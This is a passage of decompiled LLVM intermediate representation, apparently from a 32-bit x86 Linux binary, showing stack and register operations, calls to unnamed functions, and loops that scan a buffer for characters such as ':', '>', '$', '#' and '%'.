  %v1_804f6f2 = inttoptr i32 %v3_804f6f1 to i32*
  %v2_804f6f2 = load i32, i32* %v1_804f6f2, align 4
  store i32 %v2_804f6f2, i32* %ebx.global-to-local, align 4
  %v1_804f6f3 = add i32 %v0_804f6f1, 1944
  store i32 %v1_804f6f3, i32* %edx.global-to-local, align 4
  store i32 %v1_804f6f3, i32* %v1_804f6f2, align 4
  store i32 26, i32* %v1_804f6f1, align 4
  %v0_804f6fd = call i32 @function_8050940()
  store i32 %v0_804f6fd, i32* %eax.global-to-local, align 4
  store i32 %v0_804f6fd, i32* @ebx, align 4
  %v0_804f704 = load i32, i32* @esp, align 4
  %v1_804f704 = inttoptr i32 %v0_804f704 to i32*
  %v2_804f704 = load i32, i32* %v1_804f704, align 4
  store i32 %v2_804f704, i32* %eax.global-to-local, align 4
  %v3_804f704 = add i32 %v0_804f704, 4
  %v1_804f705 = inttoptr i32 %v3_804f704 to i32*
  %v2_804f705 = load i32, i32* %v1_804f705, align 4
  store i32 %v2_804f705, i32* %edx.global-to-local, align 4
  %v1_804f706 = add i32 %v0_804f704, 1944
  store i32 %v1_804f706, i32* %ecx.global-to-local, align 4
  store i32 %v1_804f706, i32* %v1_804f705, align 4
  store i32 27, i32* %v1_804f704, align 4
  %v0_804f710 = call i32 @function_8050940()
  store i32 %v0_804f710, i32* %eax.global-to-local, align 4
  store i32 %v0_804f710, i32* @esi, align 4
  %v0_804f717 = load i32, i32* @esp, align 4
  %v1_804f717 = add i32 %v0_804f717, 1944
  %v2_804f717 = inttoptr i32 %v1_804f717 to i32*
  %v3_804f717 = load i32, i32* %v2_804f717, align 4
  %v1_804f71e = add i32 %v3_804f717, -1
  store i32 %v1_804f71e, i32* %eax.global-to-local, align 4
  %v2_804f71f = add i32 %v0_804f717, -4
  %v3_804f71f = inttoptr i32 %v2_804f71f to i32*
  store i32 %v1_804f71e, i32* %v3_804f71f, align 4
  %v0_804f720 = load i32, i32* @ebx, align 4
  %v2_804f720 = add i32 %v0_804f717, -8
  %v3_804f720 = inttoptr i32 %v2_804f720 to i32*
  store i32 %v0_804f720, i32* %v3_804f720, align 4
  %v0_804f721 = load i32, i32* @edi, align 4
  %v1_804f721 = add i32 %v0_804f721, 24
  %v2_804f721 = inttoptr i32 %v1_804f721 to i32*
  %v3_804f721 = load i32, i32* %v2_804f721, align 4
  store i32 %v3_804f721, i32* %eax.global-to-local, align 4
  %v2_804f724 = add i32 %v0_804f717, -12
  %v3_804f724 = inttoptr i32 %v2_804f724 to i32*
  store i32 %v3_804f721, i32* %v3_804f724, align 4
  %v1_804f725 = add i32 %v0_804f717, 36
  %v2_804f725 = inttoptr i32 %v1_804f725 to i32*
  %v3_804f725 = load i32, i32* %v2_804f725, align 4
  store i32 %v3_804f725, i32* %eax.global-to-local, align 4
  %v2_804f729 = add i32 %v0_804f717, -16
  %v3_804f729 = inttoptr i32 %v2_804f729 to i32*
  store i32 %v3_804f725, i32* %v3_804f729, align 4
  %v0_804f72a = call i32 @function_8051070()
  %v0_804f72f = load i32, i32* @esp, align 4
  %v8_804f732 = icmp eq i32 %v0_804f72a, -1
  %v1_804f733 = icmp eq i1 %v8_804f732, false
  %v2_804f733 = zext i1 %v1_804f733 to i32
  %v2_804f736 = icmp eq i1 %v1_804f733, false
  store i32 %v2_804f733, i32* %eax.global-to-local, align 4
  %v2_804f73b = add i32 %v0_804f72f, 68
  %v3_804f73b = inttoptr i32 %v2_804f73b to i32*
  store i32 %v2_804f733, i32* %v3_804f73b, align 4
  %v1_804f741 = icmp eq i1 %v2_804f736, false
  br i1 %v1_804f741, label %dec_label_pc_804f773, label %dec_label_pc_804f743

dec_label_pc_804f743:                             ; preds = %dec_label_pc_804f6db
  %v0_804f743 = load i32, i32* @esp, align 4
  %v1_804f743 = add i32 %v0_804f743, 1928
  %v2_804f743 = inttoptr i32 %v1_804f743 to i32*
  %v3_804f743 = load i32, i32* %v2_804f743, align 4
  %v1_804f74a = add i32 %v3_804f743, -1
  store i32 %v1_804f74a, i32* %eax.global-to-local, align 4
  %v2_804f74b = add i32 %v0_804f743, -4
  %v3_804f74b = inttoptr i32 %v2_804f74b to i32*
  store i32 %v1_804f74a, i32* %v3_804f74b, align 4
  %v0_804f74c = load i32, i32* @esi, align 4
  %v2_804f74c = add i32 %v0_804f743, -8
  %v3_804f74c = inttoptr i32 %v2_804f74c to i32*
  store i32 %v0_804f74c, i32* %v3_804f74c, align 4
  %v0_804f74d = load i32, i32* @edi, align 4
  %v1_804f74d = add i32 %v0_804f74d, 24
  %v2_804f74d = inttoptr i32 %v1_804f74d to i32*
  %v3_804f74d = load i32, i32* %v2_804f74d, align 4
  store i32 %v3_804f74d, i32* %eax.global-to-local, align 4
  %v2_804f750 = add i32 %v0_804f743, -12
  %v3_804f750 = inttoptr i32 %v2_804f750 to i32*
  store i32 %v3_804f74d, i32* %v3_804f750, align 4
  %v1_804f751 = add i32 %v0_804f743, 20
  %v2_804f751 = inttoptr i32 %v1_804f751 to i32*
  %v3_804f751 = load i32, i32* %v2_804f751, align 4
  store i32 %v3_804f751, i32* %eax.global-to-local, align 4
  %v2_804f755 = add i32 %v0_804f743, -16
  %v3_804f755 = inttoptr i32 %v2_804f755 to i32*
  store i32 %v3_804f751, i32* %v3_804f755, align 4
  %v0_804f756 = call i32 @function_8051070()
  %v0_804f75b = load i32, i32* @esp, align 4
  %v8_804f75e = icmp eq i32 %v0_804f756, -1
  %v1_804f75f = icmp eq i1 %v8_804f75e, false
  %v2_804f75f = zext i1 %v1_804f75f to i32
  %v2_804f762 = icmp eq i1 %v1_804f75f, false
  store i32 %v2_804f75f, i32* %eax.global-to-local, align 4
  %v2_804f767 = add i32 %v0_804f75b, 52
  %v3_804f767 = inttoptr i32 %v2_804f767 to i32*
  store i32 %v2_804f75f, i32* %v3_804f767, align 4
  br i1 %v2_804f762, label %dec_label_pc_8050088, label %dec_label_pc_804f773

dec_label_pc_804f773:                             ; preds = %dec_label_pc_804f743, %dec_label_pc_804f6db
  %v0_804f773 = load i32, i32* @esp, align 4
  %v1_804f776 = add i32 %v0_804f773, -16
  %v2_804f776 = inttoptr i32 %v1_804f776 to i32*
  store i32 26, i32* %v2_804f776, align 4
  %v0_804f778 = call i32 @function_8050970()
  store i32 %v0_804f778, i32* %eax.global-to-local, align 4
  %v0_804f77d = load i32, i32* @esp, align 4
  %v1_804f77d = inttoptr i32 %v0_804f77d to i32*
  store i32 27, i32* %v1_804f77d, align 4
  %v0_804f784 = call i32 @function_8050970()
  store i32 %v0_804f784, i32* %eax.global-to-local, align 4
  %v0_804f789 = load i32, i32* @esp, align 4
  %v1_804f78c = add i32 %v0_804f789, 52
  %v2_804f78c = inttoptr i32 %v1_804f78c to i32*
  %v3_804f78c = load i32, i32* %v2_804f78c, align 4
  %v13_804f78c = icmp eq i32 %v3_804f78c, -1
  br i1 %v13_804f78c, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804f797

dec_label_pc_804f797:                             ; preds = %dec_label_pc_804f773, %dec_label_pc_804ff65
  %v0_804f7a7.in = phi i32 [ %v0_804f789, %dec_label_pc_804f773 ], [ %v0_804ff7b, %dec_label_pc_804ff65 ]
  %v0_804f7a7 = add i32 %v0_804f7a7.in, 16
  %v1_804f797 = add i32 %v0_804f7a7.in, 52
  %v2_804f797 = inttoptr i32 %v1_804f797 to i32*
  %v3_804f797 = load i32, i32* %v2_804f797, align 4
  %tmp148 = icmp slt i32 %v3_804f797, 1
  br i1 %tmp148, label %dec_label_pc_804fb29, label %dec_label_pc_804f7a3

dec_label_pc_804f7a3:                             ; preds = %dec_label_pc_804f797
  %v0_804f7a3 = load i32, i32* @edi, align 4
  %v1_804f7a3 = inttoptr i32 %v0_804f7a3 to i32*
  %v2_804f7a3 = load i32, i32* %v1_804f7a3, align 4
  store i32 %v2_804f7a3, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804f7a7 = add i32 %v0_804f7a7.in, 12
  %v2_804f7a7 = inttoptr i32 %v1_804f7a7 to i32*
  store i32 16384, i32* %v2_804f7a7, align 4
  %v0_804f7ac = load i32, i32* %edx.global-to-local, align 4
  %v1_804f7ac = add i32 %v0_804f7ac, 12
  %v2_804f7ac = inttoptr i32 %v1_804f7ac to i8*
  %v3_804f7ac = load i8, i8* %v2_804f7ac, align 1
  %v4_804f7ac = zext i8 %v3_804f7ac to i32
  %v5_804f7ac = load i32, i32* %eax.global-to-local, align 4
  %v6_804f7ac = and i32 %v5_804f7ac, -256
  %v7_804f7ac = or i32 %v6_804f7ac, %v4_804f7ac
  store i32 %v7_804f7ac, i32* %eax.global-to-local, align 4
  %v2_804f7af = add i32 %v0_804f7a7.in, 8
  %v3_804f7af = inttoptr i32 %v2_804f7af to i32*
  store i32 %v7_804f7ac, i32* %v3_804f7af, align 4
  %v0_804f7b0 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f7b0 = inttoptr i32 %v0_804f7b0 to i32*
  %v2_804f7b0 = load i32, i32* %v1_804f7b0, align 4
  store i32 %v2_804f7b0, i32* @esi, align 4
  %v2_804f7b2 = add i32 %v0_804f7a7.in, 4
  %v3_804f7b2 = inttoptr i32 %v2_804f7b2 to i32*
  store i32 %v2_804f7b0, i32* %v3_804f7b2, align 4
  %v0_804f7b3 = load i32, i32* @edi, align 4
  %v1_804f7b3 = add i32 %v0_804f7b3, 4
  %v2_804f7b3 = inttoptr i32 %v1_804f7b3 to i32*
  %v3_804f7b3 = load i32, i32* %v2_804f7b3, align 4
  store i32 %v3_804f7b3, i32* @ebx, align 4
  %v3_804f7b6 = inttoptr i32 %v0_804f7a7.in to i32*
  store i32 %v3_804f7b3, i32* %v3_804f7b6, align 4
  %v0_804f7b7 = call i32 @function_8051c16()
  store i32 %v0_804f7b7, i32* %eax.global-to-local, align 4
  %v0_804f7bc = load i32, i32* @esp, align 4
  %v1_804f7bc = add i32 %v0_804f7bc, -4
  %v2_804f7bc = inttoptr i32 %v1_804f7bc to i32*
  store i32 16384, i32* %v2_804f7bc, align 4
  %v1_804f7c1 = add i32 %v0_804f7bc, -8
  %v2_804f7c1 = inttoptr i32 %v1_804f7c1 to i32*
  store i32 2, i32* %v2_804f7c1, align 4
  %v1_804f7c3 = add i32 %v0_804f7bc, -12
  %v2_804f7c3 = inttoptr i32 %v1_804f7c3 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8053e82.25 to i32), i32* %v2_804f7c3, align 4
  %v0_804f7c8 = load i32, i32* @edi, align 4
  %v1_804f7c8 = add i32 %v0_804f7c8, 4
  %v2_804f7c8 = inttoptr i32 %v1_804f7c8 to i32*
  %v3_804f7c8 = load i32, i32* %v2_804f7c8, align 4
  store i32 %v3_804f7c8, i32* %ecx.global-to-local, align 4
  %v2_804f7cb = add i32 %v0_804f7bc, -16
  %v3_804f7cb = inttoptr i32 %v2_804f7cb to i32*
  store i32 %v3_804f7c8, i32* %v3_804f7cb, align 4
  %v0_804f7cc = call i32 @function_8051c16()
  store i32 %v0_804f7cc, i32* %eax.global-to-local, align 4
  %v0_804f7d4 = load i32, i32* @edi, align 4
  %v1_804f7d4 = add i32 %v0_804f7d4, 12
  %v2_804f7d4 = inttoptr i32 %v1_804f7d4 to i32*
  store i32 4, i32* %v2_804f7d4, align 4
  br label %dec_label_pc_804faab

dec_label_pc_804f7e0:                             ; preds = %dec_label_pc_804f5e0
  %v1_804f7e0 = add i32 %v0_804f5e0, 24
  %v2_804f7e0 = inttoptr i32 %v1_804f7e0 to i32*
  %v3_804f7e0 = load i32, i32* %v2_804f7e0, align 4
  %v1_804f7e3 = add i32 %v3_804f7e0, -1
  store i32 %v1_804f7e3, i32* %eax.global-to-local, align 4
  %tmp149 = icmp slt i32 %v1_804f7e3, 1
  br i1 %tmp149, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804f7ec.preheader

dec_label_pc_804f7ec.preheader:                   ; preds = %dec_label_pc_804f7e0
  %v7_804f7ec.pre = load i32, i32* @edx, align 4
  %v2_804f7ec = add i32 %v0_804f5e0, 28
  br label %dec_label_pc_804f7ec

dec_label_pc_804f7ec:                             ; preds = %dec_label_pc_804f7ec.preheader, %dec_label_pc_804f81d
  %v7_804f7ec = phi i32 [ %v7_804f7ec.pre, %dec_label_pc_804f7ec.preheader ], [ %v9_804f7ec, %dec_label_pc_804f81d ]
  %v0_804fd6f = phi i32 [ %v1_804f7e3, %dec_label_pc_804f7ec.preheader ], [ %v1_804f81d, %dec_label_pc_804f81d ]
  %v3_804f7ec = add i32 %v2_804f7ec, %v0_804fd6f
  %v4_804f7ec = inttoptr i32 %v3_804f7ec to i8*
  %v5_804f7ec = load i8, i8* %v4_804f7ec, align 1
  %v6_804f7ec = zext i8 %v5_804f7ec to i32
  %v8_804f7ec = and i32 %v7_804f7ec, -256
  %v9_804f7ec = or i32 %v6_804f7ec, %v8_804f7ec
  store i32 %v9_804f7ec, i32* %edx.global-to-local, align 4
  switch i8 %v5_804f7ec, label %dec_label_pc_804f81d [
    i8 58, label %dec_label_pc_804fd6f
    i8 62, label %dec_label_pc_804fd6f
    i8 36, label %dec_label_pc_804fd6f
    i8 35, label %dec_label_pc_804fd6f
    i8 37, label %dec_label_pc_804fd6f
  ]

dec_label_pc_804f81d:                             ; preds = %dec_label_pc_804f7ec
  %v1_804f81d = add i32 %v0_804fd6f, -1
  %v8_804f81d = icmp eq i32 %v1_804f81d, 0
  store i32 %v1_804f81d, i32* %eax.global-to-local, align 4
  %v1_804f81e = icmp eq i1 %v8_804f81d, false
  br i1 %v1_804f81e, label %dec_label_pc_804f7ec, label %dec_label_pc_804f56a.backedge

dec_label_pc_804f825:                             ; preds = %dec_label_pc_804f5e0
  %v1_804f825 = add i32 %v0_804f5e0, 24
  %v2_804f825 = inttoptr i32 %v1_804f825 to i32*
  %v3_804f825 = load i32, i32* %v2_804f825, align 4
  %v1_804f828 = add i32 %v3_804f825, -1
  store i32 %v1_804f828, i32* %eax.global-to-local, align 4
  %tmp150 = icmp slt i32 %v1_804f828, 1
  br i1 %tmp150, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804f831

dec_label_pc_804f831:                             ; preds = %dec_label_pc_804f825
  %v2_804f831 = add i32 %v0_804f5e0, 27
  %v3_804f831 = add i32 %v2_804f831, %v3_804f825
  %v4_804f831 = inttoptr i32 %v3_804f831 to i8*
  %v5_804f831 = load i8, i8* %v4_804f831, align 1
  %v6_804f831 = zext i8 %v5_804f831 to i32
  %v7_804f831 = load i32, i32* @edx, align 4
  %v8_804f831 = and i32 %v7_804f831, -256
  %v9_804f831 = or i32 %v8_804f831, %v6_804f831
  store i32 %v9_804f831, i32* %edx.global-to-local, align 4
  switch i8 %v5_804f831, label %dec_label_pc_804f83f [
    i8 62, label %dec_label_pc_804f863
    i8 58, label %dec_label_pc_804f863
  ]

dec_label_pc_804f83f:                             ; preds = %dec_label_pc_804f831, %dec_label_pc_804f855
  %v0_804f84e = phi i32 [ %v1_804f84e, %dec_label_pc_804f855 ], [ %v1_804f828, %dec_label_pc_804f831 ]
  %v7_804f855 = phi i32 [ %v9_804f855, %dec_label_pc_804f855 ], [ %v9_804f831, %dec_label_pc_804f831 ]
  %v1_804f83f = trunc i32 %v7_804f855 to i8
  %v1_804f83f.off = add i8 %v1_804f83f, -35
  %switch425 = icmp ult i8 %v1_804f83f.off, 3
  br i1 %switch425, label %dec_label_pc_804f863, label %dec_label_pc_804f84e

dec_label_pc_804f84e:                             ; preds = %dec_label_pc_804f83f
  %v1_804f84e = add i32 %v0_804f84e, -1
  %v8_804f84e = icmp eq i32 %v1_804f84e, 0
  store i32 %v1_804f84e, i32* %eax.global-to-local, align 4
  br i1 %v8_804f84e, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804f855

dec_label_pc_804f855:                             ; preds = %dec_label_pc_804f84e
  %v3_804f855 = add i32 %v2_804f831, %v0_804f84e
  %v4_804f855 = inttoptr i32 %v3_804f855 to i8*
  %v5_804f855 = load i8, i8* %v4_804f855, align 1
  %v6_804f855 = zext i8 %v5_804f855 to i32
  %v8_804f855 = and i32 %v7_804f855, -256
  %v9_804f855 = or i32 %v6_804f855, %v8_804f855
  store i32 %v9_804f855, i32* %edx.global-to-local, align 4
  %v10_804f859 = icmp ne i8 %v5_804f855, 58
  %v10_804f85e = icmp eq i8 %v5_804f855, 62
  %v1_804f861 = icmp eq i1 %v10_804f85e, false
  %or.cond250 = and i1 %v10_804f859, %v1_804f861
  br i1 %or.cond250, label %dec_label_pc_804f83f, label %dec_label_pc_804f863

dec_label_pc_804f863:                             ; preds = %dec_label_pc_804f83f, %dec_label_pc_804f855, %dec_label_pc_804f831, %dec_label_pc_804f831
  %v0_804f863 = phi i32 [ %v1_804f828, %dec_label_pc_804f831 ], [ %v1_804f828, %dec_label_pc_804f831 ], [ %v0_804f84e, %dec_label_pc_804f83f ], [ %v1_804f84e, %dec_label_pc_804f855 ]
  %v1_804f863 = add i32 %v0_804f863, 1
  store i32 %v1_804f863, i32* %eax.global-to-local, align 4
  %v1_804f864 = load i32, i32* @esp, align 4
  %v2_804f864 = add i32 %v1_804f864, 36
  %v3_804f864 = inttoptr i32 %v2_804f864 to i32*
  store i32 %v1_804f863, i32* %v3_804f864, align 4
  %v0_804f868 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f868 = add i32 %v0_804f868, 1
  %v8_804f868 = icmp eq i32 %v1_804f868, 0
  store i32 %v1_804f868, i32* %eax.global-to-local, align 4
  br i1 %v8_804f868, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804f86f

dec_label_pc_804f86f:                             ; preds = %dec_label_pc_804f863
  %v0_804f86f = load i32, i32* @esp, align 4
  %v1_804f86f = add i32 %v0_804f86f, 36
  %v2_804f86f = inttoptr i32 %v1_804f86f to i32*
  %v3_804f86f = load i32, i32* %v2_804f86f, align 4
  store i32 %v3_804f86f, i32* @esi, align 4
  %tmp151 = icmp slt i32 %v3_804f86f, 1
  br i1 %tmp151, label %dec_label_pc_804fb29, label %dec_label_pc_804f87b

dec_label_pc_804f87b:                             ; preds = %dec_label_pc_804f86f
  %v1_804f87e = add i32 %v0_804f86f, -16
  %v2_804f87e = inttoptr i32 %v1_804f87e to i32*
  store i32 6, i32* %v2_804f87e, align 4
  %v0_804f880 = call i32 @function_80509f0()
  store i32 %v0_804f880, i32* %eax.global-to-local, align 4
  %v0_804f885 = load i32, i32* @esp, align 4
  %v1_804f885 = inttoptr i32 %v0_804f885 to i32*
  %v2_804f885 = load i32, i32* %v1_804f885, align 4
  store i32 %v2_804f885, i32* %ecx.global-to-local, align 4
  %v3_804f885 = add i32 %v0_804f885, 4
  %v1_804f886 = inttoptr i32 %v3_804f885 to i32*
  %v2_804f886 = load i32, i32* %v1_804f886, align 4
  store i32 %v2_804f886, i32* @ebx, align 4
  %v1_804f887 = add i32 %v0_804f885, 1952
  store i32 %v1_804f887, i32* %ecx.global-to-local, align 4
  store i32 %v1_804f887, i32* %v1_804f886, align 4
  store i32 6, i32* %v1_804f885, align 4
  %v0_804f891 = call i32 @function_8050940()
  store i32 %v0_804f891, i32* %eax.global-to-local, align 4
  %v0_804f896 = load i32, i32* @esp, align 4
  %v1_804f896 = add i32 %v0_804f896, -4
  %v2_804f896 = inttoptr i32 %v1_804f896 to i32*
  store i32 16384, i32* %v2_804f896, align 4
  %v1_804f89b = add i32 %v0_804f896, 1952
  %v2_804f89b = inttoptr i32 %v1_804f89b to i32*
  %v3_804f89b = load i32, i32* %v2_804f89b, align 4
  store i32 %v3_804f89b, i32* %edx.global-to-local, align 4
  %v2_804f8a2 = add i32 %v0_804f896, -8
  %v3_804f8a2 = inttoptr i32 %v2_804f8a2 to i32*
  store i32 %v3_804f89b, i32* %v3_804f8a2, align 4
  %v2_804f8a3 = add i32 %v0_804f896, -12
  %v3_804f8a3 = inttoptr i32 %v2_804f8a3 to i32*
  store i32 %v0_804f891, i32* %v3_804f8a3, align 4
  %v0_804f8a4 = load i32, i32* @edi, align 4
  %v1_804f8a4 = add i32 %v0_804f8a4, 4
  %v2_804f8a4 = inttoptr i32 %v1_804f8a4 to i32*
  %v3_804f8a4 = load i32, i32* %v2_804f8a4, align 4
  store i32 %v3_804f8a4, i32* %eax.global-to-local, align 4
  %v2_804f8a7 = add i32 %v0_804f896, -16
  %v3_804f8a7 = inttoptr i32 %v2_804f8a7 to i32*
  store i32 %v3_804f8a4, i32* %v3_804f8a7, align 4
  %v0_804f8a8 = call i32 @function_8051c16()
  store i32 %v0_804f8a8, i32* %eax.global-to-local, align 4
  %v0_804f8ad = load i32, i32* @esp, align 4
  %v1_804f8b0 = add i32 %v0_804f8ad, 28
  %v2_804f8b0 = inttoptr i32 %v1_804f8b0 to i32*
  store i32 16384, i32* %v2_804f8b0, align 4
  %v1_804f8b5 = add i32 %v0_804f8ad, 24
  %v2_804f8b5 = inttoptr i32 %v1_804f8b5 to i32*
  store i32 2, i32* %v2_804f8b5, align 4
  %v1_804f8b7 = add i32 %v0_804f8ad, 20
  %v2_804f8b7 = inttoptr i32 %v1_804f8b7 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8053e82.25 to i32), i32* %v2_804f8b7, align 4
  %v0_804f8bc = load i32, i32* @edi, align 4
  %v1_804f8bc = add i32 %v0_804f8bc, 4
  %v2_804f8bc = inttoptr i32 %v1_804f8bc to i32*
  %v3_804f8bc = load i32, i32* %v2_804f8bc, align 4
  %v2_804f8bf = add i32 %v0_804f8ad, 16
  %v3_804f8bf = inttoptr i32 %v2_804f8bf to i32*
  store i32 %v3_804f8bc, i32* %v3_804f8bf, align 4
  %v0_804f8c0 = call i32 @function_8051c16()
  store i32 %v0_804f8c0, i32* %eax.global-to-local, align 4
  %v0_804f8c5 = load i32, i32* @esp, align 4
  %v1_804f8c5 = inttoptr i32 %v0_804f8c5 to i32*
  store i32 6, i32* %v1_804f8c5, align 4
  %v0_804f8cc = call i32 @function_8050970()
  store i32 %v0_804f8cc, i32* %eax.global-to-local, align 4
  %v0_804f8d4 = load i32, i32* @edi, align 4
  %v1_804f8d4 = add i32 %v0_804f8d4, 12
  %v2_804f8d4 = inttoptr i32 %v1_804f8d4 to i32*
  store i32 7, i32* %v2_804f8d4, align 4
  br label %dec_label_pc_804faab

dec_label_pc_804f8e0:                             ; preds = %dec_label_pc_804f5e0
  %v1_804f8e0 = add i32 %v0_804f5e0, 24
  %v2_804f8e0 = inttoptr i32 %v1_804f8e0 to i32*
  %v3_804f8e0 = load i32, i32* %v2_804f8e0, align 4
  %v1_804f8e3 = add i32 %v3_804f8e0, -1
  store i32 %v1_804f8e3, i32* %eax.global-to-local, align 4
  %tmp152 = icmp slt i32 %v1_804f8e3, 1
  br i1 %tmp152, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804f8ec

dec_label_pc_804f8ec:                             ; preds = %dec_label_pc_804f8e0
  %v2_804f8ec = add i32 %v0_804f5e0, 27
  %v3_804f8ec = add i32 %v2_804f8ec, %v3_804f8e0
  %v4_804f8ec = inttoptr i32 %v3_804f8ec to i8*
  %v5_804f8ec = load i8, i8* %v4_804f8ec, align 1
  %v6_804f8ec = zext i8 %v5_804f8ec to i32
  %v7_804f8ec = load i32, i32* @edx, align 4
  %v8_804f8ec = and i32 %v7_804f8ec, -256
  %v9_804f8ec = or i32 %v8_804f8ec, %v6_804f8ec
  store i32 %v9_804f8ec, i32* %edx.global-to-local, align 4
  switch i8 %v5_804f8ec, label %dec_label_pc_804f8fa [
    i8 62, label %dec_label_pc_804f91e
    i8 58, label %dec_label_pc_804f91e
  ]

dec_label_pc_804f8fa:                             ; preds = %dec_label_pc_804f8ec, %dec_label_pc_804f910
  %v0_804f909 = phi i32 [ %v1_804f909, %dec_label_pc_804f910 ], [ %v1_804f8e3, %dec_label_pc_804f8ec ]
  %v7_804f910 = phi i32 [ %v9_804f910, %dec_label_pc_804f910 ], [ %v9_804f8ec, %dec_label_pc_804f8ec ]
  %v1_804f8fa = trunc i32 %v7_804f910 to i8
  %v1_804f8fa.off = add i8 %v1_804f8fa, -35
  %switch426 = icmp ult i8 %v1_804f8fa.off, 3
  br i1 %switch426, label %dec_label_pc_804f91e, label %dec_label_pc_804f909

dec_label_pc_804f909:                             ; preds = %dec_label_pc_804f8fa
  %v1_804f909 = add i32 %v0_804f909, -1
  %v8_804f909 = icmp eq i32 %v1_804f909, 0
  store i32 %v1_804f909, i32* %eax.global-to-local, align 4
  br i1 %v8_804f909, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804f910

dec_label_pc_804f910:                             ; preds = %dec_label_pc_804f909
  %v3_804f910 = add i32 %v2_804f8ec, %v0_804f909
  %v4_804f910 = inttoptr i32 %v3_804f910 to i8*
  %v5_804f910 = load i8, i8* %v4_804f910, align 1
  %v6_804f910 = zext i8 %v5_804f910 to i32
  %v8_804f910 = and i32 %v7_804f910, -256
  %v9_804f910 = or i32 %v6_804f910, %v8_804f910
  store i32 %v9_804f910, i32* %edx.global-to-local, align 4
  %v10_804f914 = icmp ne i8 %v5_804f910, 58
  %v10_804f919 = icmp eq i8 %v5_804f910, 62
  %v1_804f91c = icmp eq i1 %v10_804f919, false
  %or.cond251 = and i1 %v10_804f914, %v1_804f91c
  br i1 %or.cond251, label %dec_label_pc_804f8fa, label %dec_label_pc_804f91e

dec_label_pc_804f91e:                             ; preds = %dec_label_pc_804f8fa, %dec_label_pc_804f910, %dec_label_pc_804f8ec, %dec_label_pc_804f8ec
  %v0_804f91e = phi i32 [ %v1_804f8e3, %dec_label_pc_804f8ec ], [ %v1_804f8e3, %dec_label_pc_804f8ec ], [ %v0_804f909, %dec_label_pc_804f8fa ], [ %v1_804f909, %dec_label_pc_804f910 ]
  %v1_804f91e = add i32 %v0_804f91e, 1
  store i32 %v1_804f91e, i32* %eax.global-to-local, align 4
  %v1_804f91f = load i32, i32* @esp, align 4
  %v2_804f91f = add i32 %v1_804f91f, 36
  %v3_804f91f = inttoptr i32 %v2_804f91f to i32*
  store i32 %v1_804f91e, i32* %v3_804f91f, align 4
  %v0_804f923 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f923 = add i32 %v0_804f923, 1
  %v8_804f923 = icmp eq i32 %v1_804f923, 0
  store i32 %v1_804f923, i32* %eax.global-to-local, align 4
  br i1 %v8_804f923, label %dec_label_pc_804f56a.backedge, label %dec_label_pc_804f92a

dec_label_pc_804f92a:                             ; preds = %dec_label_pc_804f91e
  %v0_804f92a = load i32, i32* @esp, align 4
  %v1_804f92a = add i32 %v0_804f92a, 36
  %v2_804f92a = inttoptr i32 %v1_804f92a to i32*
  %v3_804f92a = load i32, i32* %v2_804f92a, align 4
  store i32 %v3_804f92a, i32* @esi, align 4
  %tmp153 = icmp slt i32 %v3_804f92a, 1
  br i1 %tmp153, label %dec_label_pc_804fb29, label %dec_label_pc_804f936

dec_label_pc_804f936:                             ; preds = %dec_label_pc_804f92a
  %v1_804f939 = add i32 %v0_804f92a, -16
  %v2_804f939 = inttoptr i32 %v1_804f939 to i32*
  store i32 4, i32* %v2_804f939, align 4
  %v0_804f93b = call i32 @function_80509f0()
  store i32 %v0_804f93b, i32* %eax.global-to-local, align 4
  %v0_804f940 = load i32, i32* @esp, align 4
  %v1_804f940 = inttoptr i32 %v0_804f940 to i32*
  %v2_804f940 = load i32, i32* %v1_804f940, align 4
  store i32 %v2_804f940, i32* %ecx.global-to-local, align 4
  %v3_804f940 = add i32 %v0_804f940, 4
  %v1_804f941 = inttoptr i32 %v3_804f940 to i32*
  %v2_804f941 = load i32, i32* %v1_804f941, align 4
  store i32 %v2_804f941, i32* @ebx, align 4
  %v1_804f942 = add i32 %v0_804f940, 1952
  store i32 %v1_804f942, i32* %eax.global-to-local, align 4
  store i32 %v1_804f942, i32* %v1_804f941, align 4
  store i32 4, i32* %v1_804f940, align 4
  %v0_804f94c = call i32 @function_8050940()
  store i32 %v0_804f94c, i32* %eax.global-to-local, align 4
  %v0_804f951 = load i32, i32* @esp, align 4
  %v1_804f951 = add i32 %v0_804f951, -4
  %v2_804f951 = inttoptr i32 %v1_804f951 to i32*
  store i32 16384, i32* %v2_804f951, align 4
  %v1_804f956 = add i32 %v0_804f951, 1952
  %v2_804f956 = inttoptr i32 %v1_804f956 to i32*
  %v3_804f956 = load i32, i32* %v2_804f956, align 4
  store i32 %v3_804f956, i32* %edx.global-to-local, align 4
  %v2_804f95d = add i32 %v0_804f951, -8
  %v3_804f95d = inttoptr i32 %v2_804f95d to i32*
  store i32 %v3_804f956, i32* %v3_804f95d, align 4
  %v2_804f95e = add i32 %v0_804f951, -12
  %v3_804f95e = inttoptr i32 %v2_804f95e to i32*
  store i32 %v0_804f94c, i32* %v3_804f95e, align 4
  %v0_804f95f = load i32, i32* @edi, align 4
  %v1_804f95f = add i32 %v0_804f95f, 4
  %v2_804f95f = inttoptr i32 %v1_804f95f to i32*
  %v3_804f95f = load i32, i32* %v2_804f95f, align 4
  store i32 %v3_804f95f, i32* %eax.global-to-local, align 4
  %v2_804f962 = add i32 %v0_804f951, -16
  %v3_804f962 = inttoptr i32 %v2_804f962 to i32*
  store i32 %v3_804f95f, i32* %v3_804f962, align 4
  %v0_804f963 = call i32 @function_8051c16()
  store i32 %v0_804f963, i32* %eax.global-to-local, align 4
  %v0_804f968 = load i32, i32* @esp, align 4
  %v1_804f96b = add i32 %v0_804f968, 28
  %v2_804f96b = inttoptr i32 %v1_804f96b to i32*
  store i32 16384, i32* %v2_804f96b, align 4
  %v1_804f970 = add i32 %v0_804f968, 24
  %v2_804f970 = inttoptr i32 %v1_804f970 to i32*
  store i32 2, i32* %v2_804f970, align 4
  %v1_804f972 = add i32 %v0_804f968, 20
